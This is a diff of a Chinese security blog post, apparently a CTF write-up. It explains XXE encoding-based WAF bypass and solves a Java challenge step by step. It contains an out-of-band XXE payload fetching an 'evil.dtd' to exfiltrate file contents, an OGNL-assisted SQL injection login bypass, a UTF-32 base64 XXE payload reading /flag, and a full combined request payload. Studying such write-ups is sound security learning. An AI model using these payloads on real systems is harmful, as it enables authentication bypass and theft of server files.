@@ -440,8 +440,9 @@
 <p>如果在响应包中<strong>无回显又想要读取敏感文件</strong>时，可以通过<code>OOB</code>带外注入的方法<strong>通过外带数据通道来提取数据</strong>，构造<code>payload</code>如下 ：</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">GVI</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">body</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///tmp/test.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line">//攻击者远程部署evil.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">write</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://localhost:9090/landing?text=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-
-
+<h3 id="XXE-介绍与绕过"><a href="#XXE-介绍与绕过" class="headerlink" title="XXE 介绍与绕过"></a>XXE 介绍与绕过</h3><p>一个 <code>xml</code> 文档不仅可以用 <code>UTF-8</code> 编码，也可以用 <code>UTF-16(两个变体 - BE 和 LE)、UTF-32(四个变体 - BE、LE、2143、3412)</code> 和 <code>EBCDIC</code> 编码。 </p>
+<p>在这种编码的帮助下，使用<code>正则表达式可以很容易地绕过 WAF</code>，因为在这种类型的 WAF 中，正则表达式<code>通常仅配置为单字符集</code>。 <code>外来编码也可用于绕过成熟的 WAF</code>，因为它们并不总是能够处理上面列出的所有编码。</p>
+<p>例如，<code>libxml2</code> 解析器只支持一种类型的 <code>utf-32 - utf-32BE</code>，特别是不支持 <code>BOM</code>。</p>
 <hr>
 <h2 id="五、ssrf"><a href="#五、ssrf" class="headerlink" title="五、ssrf"></a>五、ssrf</h2><h3 id="不当函数利用"><a href="#不当函数利用" class="headerlink" title="不当函数利用"></a>不当函数利用</h3><blockquote>
 <p>PHP中下面函数的使用不当会导致SSRF:<br>&#96;&#96;file_get_contents()<code> </code>fsockopen()<code> </code>curl_exec()&#96;   </p>
@@ -2941,12 +2942,158 @@
 
 <blockquote>
 <p>发现其对<code>password</code>这个参数中的数据也进行了过滤，长度<code>不能超过50</code>个字符，且其中不能有单引号<code>&#39;</code></p>
+<p>否则就会失败返回</p>
+</blockquote>
+<blockquote>
+<p>并且在<code>sayHello</code>函数中，还有其他三个参数</p>
+<p><code>String poc, String type, String yourclasses</code></p>
+<p>这三个参数也是最后传入<code>xxe函数</code>的三个参数</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> xxe(poc, type, classes);</span><br></pre></td></tr></table></figure>
+
+<p>【但是<code>yourclasses</code>参数被进行了分割，以<code>,</code>为分割，分成4份</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] classes = yourclasses.split(<span class="string">&quot;,&quot;</span>, <span class="number">4</span>);</span><br></pre></td></tr></table></figure>
+
+<p>所以对<code>yourclasses</code>的参数赋值需要考虑</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;&gt;<code>xxe注入</code>需要四个参数</p>
+<p><code>String password, String poc, String type, String yourclasses</code></p>
+<p>其中</p>
+<ul>
+<li><code>password</code>参数值需要绕过单引号（常识猜测是sql注入，以单引号闭合，用万能密码</li>
+<li><code>poc</code>参数值按常理应该就是xxe注入的内容</li>
+<li><code>type</code>参数值还不太确定</li>
+<li><code>yourclasses</code>参数值以<code>,</code>分割为4份，具体值可能就是帮助<code>poc</code>进行绕过过滤的</li>
+</ul>
 </blockquote>
 <p>同样在该类中，底下就是过滤黑名单</p>
 <p><img src="/2022/06/26/Game-wp/image-20230123154032645.png" alt="image-20230123154032645"></p>
 <blockquote>
 <p>可以看到将<code>!DOCTYPE</code>进行了过滤</p>
 </blockquote>
+<h3 id="password参数"><a href="#password参数" class="headerlink" title="password参数"></a>password参数</h3><p>查找password参数在哪里被利用时</p>
+<p>在<code>com.example.demo.mapper.UserProvider</code></p>
+<p><img src="/2022/06/26/Game-wp/image-20230124131633821.png" alt="image-20230124131633821"></p>
+<p>发现其果然被<code>sql</code>查询利用 ，以<code>&#39;)</code>闭合</p>
+<p>但是单引号被过滤了如何闭合，然后实现万能密码呢</p>
+<h4 id="Ognl-注入绕过引用过滤"><a href="#Ognl-注入绕过引用过滤" class="headerlink" title="Ognl 注入绕过引用过滤"></a>Ognl 注入绕过引用过滤</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="meta">@java</span>.lang.Character<span class="meta">@toString(39)</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>简而言之，<code>mybatis</code>会调用<code>OGNL parser</code>来解析<code>sql</code>语句中以 <code>$&#123;&#125;</code> 或者 <code>#&#123;&#125;</code> 中的表达式并将执行结果替换进去</p>
+</blockquote>
+<p>这里的<code>39</code>就是单引号的<code>ascii</code>编码</p>
+<p>于是构造<code>sql</code>注入万能密码</p>
+<blockquote>
+<p><code>password=1</code><strong><code>$&#123;@java.lang.Character@toString(39)&#125;</code></strong><code>) or 1=1#</code></p>
+</blockquote>
+<h3 id="poc参数"><a href="#poc参数" class="headerlink" title="poc参数"></a>poc参数</h3><p>先分析一下<code>xxe</code>函数</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">xxe</span><span class="params">(String b64poc, String type, String[] classes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">byte</span>[] bytepoc = Base64.getDecoder().decode(b64poc);</span><br><span class="line">    <span class="keyword">if</span> (check(bytepoc)) &#123;</span><br><span class="line">      <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">      <span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line">      <span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="type">Object</span> <span class="variable">wrappoc</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;);</span><br><span class="line">      <span class="keyword">if</span> (type.equals(<span class="string">&quot;string&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">stringpoc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytepoc);</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; stringpoc &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bytepoc &#125;);</span><br><span class="line">      &#125; </span><br><span class="line">      inputSource = Class.forName(classes[<span class="number">2</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">3</span>]) &#125;).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; wrappoc &#125;);</span><br><span class="line">      <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(inputSource);</span><br><span class="line">      <span class="type">NodeList</span> <span class="variable">nodes</span> <span class="operator">=</span> doc.getChildNodes();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nodes.getLength(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nodes.item(i).getNodeType() == <span class="number">1</span>) &#123;</span><br><span class="line">          res = res + nodes.item(i).getTextContent();</span><br><span class="line">          System.out.println(nodes.item(i).getTextContent());</span><br><span class="line">        &#125; </span><br><span class="line">      &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>poc</code>传入后变为<code>b64poc</code></p>
+<p>然后<code>b64poc</code>进行<code>base64</code>解码，然后<code>check</code>函数进行过滤<code>!DOCTYPE</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytepoc = Base64.getDecoder().decode(b64poc);</span><br></pre></td></tr></table></figure>
+
+<p>这里就提及一个知识点xxe的编码绕过</p>
+<blockquote>
+<p>一个 xml 文档不仅可以用 UTF-8 编码，也可以用 UTF-16(两个变体 - BE 和 LE)、UTF-32(四个变体 - BE、LE、2143、3412) 和 EBCDIC 编码。</p>
+</blockquote>
+<p>而一般过滤都是单字符集过滤，利用上面的编码就可以绕过，而且利用上面方式加码的<code>xml</code>文档仍然可以被正常读取解析，</p>
+<p>这里将其进行<code>UTF-16</code>加码，于是构造payload</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;&lt;!DOCTYPE test [ \n&quot;</span></span><br><span class="line">                + <span class="string">&quot;\t&lt;!ENTITY xxe SYSTEM \&quot;file:///flag\&quot;&gt; \n&quot;</span></span><br><span class="line">                + <span class="string">&quot;]&gt; \n&quot;</span>y</span><br><span class="line">                + <span class="string">&quot;&lt;ttoc&gt;&amp;xxe;&lt;/ttoc&gt;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> <span class="string">&quot;UTF-32&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(body.getBytes(type)));</span><br><span class="line">        System.out.println(<span class="string">&quot;poc=&quot;</span>+poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后得到<code>poc</code>的参数值</p>
+<blockquote>
+<p><code>poc=AAAAPAAAACEAAABEAAAATwAAAEMAAABUAAAAWQAAAFAAAABFAAAAIAAAAHQAAABlAAAAcwAAAHQAAAAgAAAAWwAAACAAAAAKAAAACQAAADwAAAAhAAAARQAAAE4AAABUAAAASQAAAFQAAABZAAAAIAAAAHgAAAB4AAAAZQAAACAAAABTAAAAWQAAAFMAAABUAAAARQAAAE0AAAAgAAAAIgAAAGYAAABpAAAAbAAAAGUAAAA6AAAALwAAAC8AAAAvAAAAZgAAAGwAAABhAAAAZwAAACIAAAA+AAAAIAAAAAoAAABdAAAAPgAAACAAAAAKAAAAPAAAAHcAAABzAAAAdwAAAD4AAAAmAAAAeAAAAHgAAABlAAAAOwAAADwAAAAvAAAAdwAAAHMAAAB3AAAAPg==</code></p>
+<p>但是发送请求包中<code>base64</code>编码，需要对数据再进行<code>url</code>编码，不然类型<code>=</code>或<code>+</code>会被视为<code>url</code>中的参数和空格符号</p>
+<p><code>poc=AAAAPAAAACEAAABEAAAATwAAAEMAAABUAAAAWQAAAFAAAABFAAAAIAAAAHQAAABlAAAAcwAAAHQAAAAgAAAAWwAAACAAAAAKAAAACQAAADwAAAAhAAAARQAAAE4AAABUAAAASQAAAFQAAABZAAAAIAAAAHgAAAB4AAAAZQAAACAAAABTAAAAWQAAAFMAAABUAAAARQAAAE0AAAAgAAAAIgAAAGYAAABpAAAAbAAAAGUAAAA6AAAALwAAAC8AAAAvAAAAZgAAAGwAAABhAAAAZwAAACIAAAA%2BAAAAIAAAAAoAAABdAAAAPgAAACAAAAAKAAAAPAAAAHcAAABzAAAAdwAAAD4AAAAmAAAAeAAAAHgAAABlAAAAOwAAADwAAAAvAAAAdwAAAHMAAAB3AAAAPg%3D%3D</code></p>
+</blockquote>
+<h3 id="type参数"><a href="#type参数" class="headerlink" title="type参数"></a>type参数</h3><p>在<code>xxe</code>函数中，对于<code>type</code>参数</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (type.equals(<span class="string">&quot;string&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">stringpoc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytepoc);</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; stringpoc &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bytepoc &#125;);</span><br><span class="line">      &#125; </span><br></pre></td></tr></table></figure>
+
+<p>似乎对于结果没什么影响，只是对<code>type</code>参数值为不为<code>string</code>时，对<code>wrappoc</code>值有变化【是<code>byte</code>类型的<code>poc</code>参数值，还是<code>string</code>类型的<code>poc</code>参数值】</p>
+<p>但是<code>wrappoc</code>参数对后续结果没用影响，猜测<code>type</code>参数值应该可以顺便填，就按其代码赋值也行</p>
+<blockquote>
+<p><code>type=string</code></p>
+</blockquote>
+<h3 id="yourclasses参数"><a href="#yourclasses参数" class="headerlink" title="yourclasses参数"></a>yourclasses参数</h3><p><code>yourclasses</code>参数传入<code>xxe</code>函数时，以<code>classes</code>参数名</p>
+<p>前面提到过,<code>yourclasses</code>参数以<code>,</code>为分割，分成四份</p>
+<p>前两部分</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;);</span><br></pre></td></tr></table></figure>
+
+<p>后两部分</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">inputSource = Class.forName(classes[<span class="number">2</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">3</span>]) &#125;).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; wrappoc &#125;);</span><br><span class="line">      <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(inputSource);</span><br></pre></td></tr></table></figure>
+
+<p>先分析一下</p>
+<blockquote>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;)</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.geeksforgeeks.org/java-lang-class-class-java-set-1/"><strong>java.lang.Class 类</strong></a>的**forName()**方法用于获取具有指定类名的该类的实例。此类名称指定为字符串参数</p>
+<p>简而言之，<strong>Class.forName</strong> 方法的作用，就是初始化给定的类。</p>
+</blockquote>
+<h4 id="classes-0-amp-classes-1"><a href="#classes-0-amp-classes-1" class="headerlink" title="classes[0]&amp;classes[1]"></a>classes[0]&amp;classes[1]</h4><blockquote>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;);</span><br></pre></td></tr></table></figure>
+
+<p>这段代码使用了反射机制。它首先使用 <code>Class.forName(classes[0])</code> 方法来获取类的 <code>Class</code> 对象。</p>
+<p>然后使用 <code>getDeclaredConstructor(new Class[] &#123; Class.forName(classes[1]) &#125;)</code> 方法来获取该类的构造函数。</p>
+<p>该方法的参数是一个 <code>Class</code> 数组，表示该构造函数的参数类型。在这里，该构造函数只有一个参数，且其参数的类型是 <code>classes[1]</code> 中所表示的类。最后将获取到的构造函数赋值给 <code>constructor</code> 变量。</p>
+<blockquote>
+<p>反射机制是 Java 编程语言中一种用于获取类、接口、构造方法、字段、方法等信息的机制。反射机制允许程序在运行时动态地获取、使用、操作类的相关信息。</p>
+</blockquote>
+</blockquote>
+<p><strong>&#x3D;&#x3D;&gt;</strong></p>
+<blockquote>
+<p><code>classes[0]</code>：</p>
+<p>这个是看其他大佬wp清楚了，这里赋值字节数组 <code>java.io.ByteArrayInputStream</code>,然后<code>bytepoc</code>通过<strong>ByteArrayInputStream转换为输入流</strong>，因为其类中有<code>read()</code>可以读取数据</p>
+<p><code>classes[1]</code>：</p>
+<p>是数组参数数据类型，根据数组参数类型”<code>[B</code>“ 是表示字节数组 (byte array) 的类型名称。</p>
+<blockquote>
+<p>在 java 中，数组类型的类型名称会在前面加上 “[“ 符号表示，比如<code>[I</code>代表 int 类型的数组类型名称，但是由于string不是基本数据类型，只能用类表示<code>[Ljava.lang.String;</code></p>
+</blockquote>
+</blockquote>
+<p><strong>所以</strong></p>
+<blockquote>
+<p><code>classes[0]=java.io.ByteArrayInputStream</code></p>
+<p><code>classes[1]=[B</code>   (因为<code>bytepoc</code>为<code>byte</code>数据类型，所以这里传入<code>ByteArrayInputStream</code>类中的构造函数的参数类型也声明为<code>byte</code></p>
+</blockquote>
+<h4 id="classes-2-amp-classes-3"><a href="#classes-2-amp-classes-3" class="headerlink" title="classes[2]&amp;classes[3]"></a>classes[2]&amp;classes[3]</h4><blockquote>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">inputSource = Class.forName(classes[<span class="number">2</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">3</span>]) &#125;).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; wrappoc &#125;);</span><br><span class="line">      <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(inputSource);</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>inputSource</code>参数是</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line">...</span><br><span class="line"><span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这段代码首先使用 <code>Class.forName(classes[2])</code> 方法来获取第三个参数所表示的类的 <code>Class</code> 对象，在这里是 <code>org.xml.sax.InputSource</code> 类，这个类是 <code>SAX (Simple API for XML)</code> 中用于读取 <code>XML</code> 文档的一个类。</p>
+<p>然后使用 <code>getDeclaredConstructor(new Class[] &#123; Class.forName(classes[3]) &#125;)</code> 方法来获取该类的构造函数，在这里是 <code>org.xml.sax.InputSource</code> 类的构造函数，接受一个参数是 <code>classes[3]</code> 所表示的类。</p>
+<p>之后使用 <code>newInstance(new Object[] &#123; wrappoc &#125;)</code> 方法来创建一个 <code>org.xml.sax.InputSource</code> 类型的实例，使用参数值为 <code>wrappoc</code> 的构造函数来创建这个实例。</p>
+<p>接着使用 <code>builder.parse(inputSource)</code> 方法来解析 <code>inputSource</code> 对象，这里的 <code>builder</code> 是 <code>DocumentBuilder</code> 类型的对象，<code>DocumentBuilder</code> 是 <code>javax.xml.parsers</code> 包中提供的一个类，其作用是创建 <strong>DOM 解析器</strong>，用于<code>解析 XML 文档</code></p>
+<p>&#x3D;&#x3D;&gt;</p>
+<p><code>inputSource</code>值为恶意xml文件内容</p>
+<p><code>doc</code>值为解析恶意xml文件后得到的内容</p>
+</blockquote>
+<p>在代码还有一段实现打印的代码，这段代码就完成了把<code>doc</code>中解析恶意xml文档后得到的内容，打印输出</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">NodeList</span> <span class="variable">nodes</span> <span class="operator">=</span> doc.getChildNodes();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nodes.getLength(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nodes.item(i).getNodeType() == <span class="number">1</span>) &#123;</span><br><span class="line">          res = res + nodes.item(i).getTextContent();</span><br><span class="line">          System.out.println(nodes.item(i).getTextContent());</span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这段代码首先使用 <code>doc.getChildNodes()</code> 方法获取文档中的所有子节点，并将它们存储在 <code>NodeList</code> 对象中。</p>
+<p>然后使用一个 <code>for</code> 循环来遍历 <code>NodeList</code> 中的每个子节点。在每次循环中，使用 <code>nodes.item(i)</code> 方法获取当前遍历到的子节点。</p>
+<p>之后使用 <code>if</code> 语句来检查当前子节点的类型。如果该类型为<code>1</code> (即元素节点)，则使用 <code>nodes.item(i).getTextContent()</code> 方法获取该元素节点的文本内容并将其加到 <code>res</code> 变量中。然后使用 <code>System.out.println(nodes.item(i).getTextContent())</code> 方法将该文本内容打印到控制台。</p>
+<p><strong>总的来说</strong>，这段代码用于遍历文档中所有子节点，并将所有元素节点的文本内容提取出来并存储在 res 变量中，同时将其打印到控制台。</p>
+<p>这段代码通过遍历<code>doc</code>中的所有子节点,并将所有元素节点的文本内容获取出来并存储在<code>res</code>变量中,同时将其打印到控制台(这段代码在爬虫领域很常用来提取网页中的文本内容)</p>
+</blockquote>
+<p><strong>所以</strong></p>
+<blockquote>
+<p><code>classes[2]=org.xml.sax.InputSource</code></p>
+<p>&#x2F;&#x2F;这里为<code>org.xml.sax.InputSource</code>类，用于读取xml文件，将其转化为可解析的xml格式，便于后面进行</p>
+<p><code>classes[3]=java.io.InputStream</code>     </p>
+<p>&#x2F;&#x2F;<code>java.io.ByteArrayInputStream</code>是<code>java.io.InputStream</code>的子类，但是<code>java.io.ByteArrayInputStream</code>不能直接作为构造函数的参数传入 <code>org.xml.sax.InputSource</code> 类的构造函数,因为<code>org.xml.sax.InputSource</code>和 <code>java.io.InputStream</code> 之间并没有继承关系。</p>
+<p>&#x2F;&#x2F;如果<code>classes[3]=java.io.ByteArrayInputStream</code>，会导致程序在执行 <code>newInstance(new Object[] &#123; wrappoc &#125;)</code> 方法时出现异常,因为类型不匹配，</p>
+<p>除非<code>ByteArrayInputStream</code>转换为<code>InputStream</code> 类型的对象才能传入 <code>org.xml.sax.InputSource</code> 类的构造函数</p>
+</blockquote>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><blockquote>
+<p><code>password=1$&#123;@java.lang.Character@toString(39)&#125;) or 1=1#&amp;poc=AAAAPAAAACEAAABEAAAATwAAAEMAAABUAAAAWQAAAFAAAABFAAAAIAAAAHQAAABlAAAAcwAAAHQAAAAgAAAAWwAAACAAAAAKAAAACQAAADwAAAAhAAAARQAAAE4AAABUAAAASQAAAFQAAABZAAAAIAAAAHgAAAB4AAAAZQAAACAAAABTAAAAWQAAAFMAAABUAAAARQAAAE0AAAAgAAAAIgAAAGYAAABpAAAAbAAAAGUAAAA6AAAALwAAAC8AAAAvAAAAZgAAAGwAAABhAAAAZwAAACIAAAA%2BAAAAIAAAAAoAAABdAAAAPgAAACAAAAAKAAAAPAAAAHcAAABzAAAAdwAAAD4AAAAmAAAAeAAAAHgAAABlAAAAOwAAADwAAAAvAAAAdwAAAHMAAAB3AAAAPg%3D%3D&amp;type=&quot;string&quot;&amp;yourclasses=java.io.ByteArrayInputStream,[B,org.xml.sax.InputSource,java.io.InputStream</code></p>
+</blockquote>
+<p><img src="/2022/06/26/Game-wp/image-20230125004553248.png" alt="image-20230125004553248"></p>
 <h2 id="PrettierOnline"><a href="#PrettierOnline" class="headerlink" title="PrettierOnline"></a>PrettierOnline</h2><h2 id="filecheacker-mini"><a href="#filecheacker-mini" class="headerlink" title="filecheacker_mini"></a>filecheacker_mini</h2><h2 id="filecheacker-pro"><a href="#filecheacker-pro" class="headerlink" title="filecheacker_pro"></a>filecheacker_pro</h2><h2 id="filecheacker-pro-max"><a href="#filecheacker-pro-max" class="headerlink" title="filecheacker_pro_max"></a>filecheacker_pro_max</h2>]]></content>
       <categories>
         <category>网络安全学习</category>
